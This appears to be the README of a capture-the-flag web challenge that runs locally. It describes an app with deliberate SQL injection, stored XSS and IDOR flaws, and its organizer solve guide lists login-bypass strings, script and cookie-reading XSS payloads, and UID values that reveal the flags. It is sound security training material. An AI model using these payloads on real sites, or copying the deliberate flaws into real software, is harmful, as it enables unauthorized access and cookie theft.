# SEC_BLOG — CTF Web Challenge

## 3 vulnerabilities hidden in a real backend

| # | Vulnerability | Hint |
|---|---------------|------|
| 1 | SQL Injection  | bypass login without a password |
| 2 | Stored XSS    | inject a script in the post form |
| 3 | IDOR          | access other users via /api/users/:uid |

## Setup

```bash
npm install
node server.js
```

Open → http://localhost:3000

## Flags
All flags live in the **database** only. Zero flags in frontend source.

## Solve guide (for organizer)

### Challenge 1 — SQL Injection
Payload in username field:
```
admin'--
```
or
```
' OR '1'='1
```

### Challenge 2 — Stored XSS
Post this in the feed:
```html
<script>alert('xss')</script>
```
or
```html
<img src=x onerror="alert(document.cookie)">
```

### Challenge 3 — IDOR
After login, navigate to profile lookup tab and change the UID:
- UID 2 → alice's flag
- UID 4 → hidden flag_user's flag
